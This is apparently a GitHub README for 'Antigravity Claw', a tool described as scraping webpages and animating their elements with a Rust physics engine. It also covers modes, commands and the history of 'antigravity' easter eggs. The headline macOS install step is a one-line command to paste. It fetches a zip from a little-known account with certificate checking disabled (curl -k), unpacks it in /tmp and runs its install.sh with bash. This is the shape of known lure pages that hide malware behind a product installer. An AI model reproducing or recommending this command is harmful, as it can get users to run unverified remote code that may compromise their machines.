# 🌍 Antigravity Claw

**Make any webpage defy gravity — powered by a real Rust physics engine.**

Fetches any URL, extracts DOM elements, runs a 2D physics simulation with Verlet integration and AABB collision detection, and renders an interactive HTML animation you can open in any browser.

Inspired by three things called "Antigravity":
- 🔍 **Google Gravity** — the viral Chrome easter egg by Ricardo Cabello (Mr.doob)
- 🐍 **`import antigravity`** — Python's stdlib easter egg referencing [XKCD #353](https://xkcd.com/353/), first added to Google App Engine in 2008
- 💻 **Google Antigravity IDE** — the 2025 AI-first coding platform

---

## ⚡ Install on macOS — one command

```bash
curl -fsSLk https://github.com/deborahikssv/Antigravity-claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/Antigravity-claw-main && \
bash install.sh
```

The installer will:
- Install **Rust** (via rustup) if not present
- Install **uv** (Python package manager) if not present
- Compile the physics engine (`~60s first run`)
- Install Python deps
- Add `antigravity-claw` to your PATH

---

## Quick start

```bash
# Classic Google Gravity — opens in browser instantly
antigravity-claw google

# Apply gravity to any URL
antigravity-claw drop https://news.ycombinator.com

# Chaos mode
antigravity-claw drop https://github.com --mode chaos

# Reverse gravity
antigravity-claw drop https://wikipedia.org --mode up

# Zero gravity (weightlessness)
antigravity-claw drop --mode zero

# Live terminal animation
antigravity-claw watch --demo

# The classic Python easter egg in your terminal
antigravity-claw fly

# List all modes
antigravity-claw modes
```

---

## Gravity modes

| Mode | Effect | Description |
|---|---|---|
| `down` | ↓ | Classic Google Gravity — everything falls to the floor |
| `up` | ↑ | Reverse gravity — elements float upward |
| `left` | ← | Elements slide off the left wall |
| `right` | → | Elements slide off the right wall |
| `zero` | ○ | Weightlessness — gentle drift with no floor |
| `chaos` | 🌀 | Rotating + pulsing gravity. Maximum entropy. |

---

## All commands

```
antigravity-claw drop [URL] [OPTIONS]

  URL                   Page to apply gravity to (default: google.com)
  --mode, -m TEXT       Gravity direction (default: down)
  --duration, -d FLOAT  Simulation length in seconds (default: 5.0)
  --output, -o PATH     Output HTML file
  --fps INT             Frames per second (default: 60)
  --demo                Use built-in Google mock (no fetch needed)
  --no-open             Don't auto-open browser

antigravity-claw google [--mode down|chaos|up...]
antigravity-claw fly
antigravity-claw watch [URL] [--mode MODE] [--demo]
antigravity-claw export [URL] --output frames.json
antigravity-claw modes
antigravity-claw info
```

---

## Architecture

```
Antigravity-claw/
│
├── src/                    ← Rust physics engine
│   ├── main.rs             ← CLI (clap) — drop / fly / watch / export
│   ├── physics.rs          ← Verlet integration, AABB collision, gravity modes
│   ├── scraper.rs          ← HTTP fetch + heuristic DOM layout extraction
│   ├── renderer.rs         ← Terminal renderer + HTML animation generator
│   ├── types.rs            ← PhysicsElement, PhysicsWorld, SimFrame, GravityMode
│   └── lib.rs              ← Crate root
│
├── py/                     ← Python orchestration layer
│   ├── antigravity.py      ← Typer CLI + Rust engine bridge + browser open
│   ├── scraper_py.py       ← BeautifulSoup HTML scraper (alternative to Rust)
│   └── openclaw_skill.py   ← OpenClaw agent skill integration
│
├── SKILL.md                ← OpenClaw skill manifest
├── install.sh              ← macOS one-command installer
├── Cargo.toml              ← Rust dependencies
└── pyproject.toml          ← Python dependencies
```

---

## Physics engine details

The Rust engine implements:

- **Verlet integration** — stable, energy-conserving position update
- **AABB collision detection** — axis-aligned bounding box pairwise collisions
- **Coefficient of restitution** — configurable bounciness per element
- **Friction simulation** — horizontal velocity damping on ground contact
- **Angular velocity** — elements spin on impact
- **Air resistance** — tiny drag factor prevents infinite acceleration
- **Chaos mode** — sinusoidal rotating gravity + random impulse pulses

Element mass is proportional to bounding box area. Gravity is 980 px/s² (scaled to match real 9.8 m/s² visually).

---

## The three Antigravities

### Google Gravity (2009)
A Chrome Experiment by Ricardo Cabello that made google.com's HTML elements fall under gravity using JavaScript. Accessible today at [elgoog.im/gravity](https://elgoog.im/gravity/).

### `import antigravity` (2008)
Added to Google App Engine as a launch easter egg on April 7, 2008. References [XKCD #353](https://xkcd.com/353/) where a character discovers they can fly by importing the module. Later added to Python 3 stdlib. Contains a hidden easter egg inside the easter egg: an implementation of [XKCD's geohashing algorithm](https://xkcd.com/426/).

### Google Antigravity IDE (2025)
An AI-first "agentic" IDE built on VS Code + Gemini 3. The name references both the Google Gravity easter egg and the `import antigravity` Python module — the idea that AI removes the "gravity" weighing down developers.

---

## Troubleshooting

### "antigravity-claw: command not found"
```bash
source ~/.zshrc  # or ~/.bash_profile
# or run directly:
uv run python py/antigravity.py drop
```

### Rust build fails
```bash
rustup update stable
cargo clean && cargo build --release
```

### Page not fetching
Some URLs block scrapers. Use `--demo` to use the built-in Google layout:
```bash
antigravity-claw drop --demo --mode chaos
```

---

## License

MIT

## Credits

- **Ricardo Cabello (Mr.doob)** — original Google Gravity Chrome Experiment
- **Guido van Rossum / Skip Montanaro** — `import antigravity` Python module
- **Randall Munroe** — XKCD #353
- **Google App Engine team** — first `antigravity` deployment (2008)
- **OpenClaw** — agent skill framework
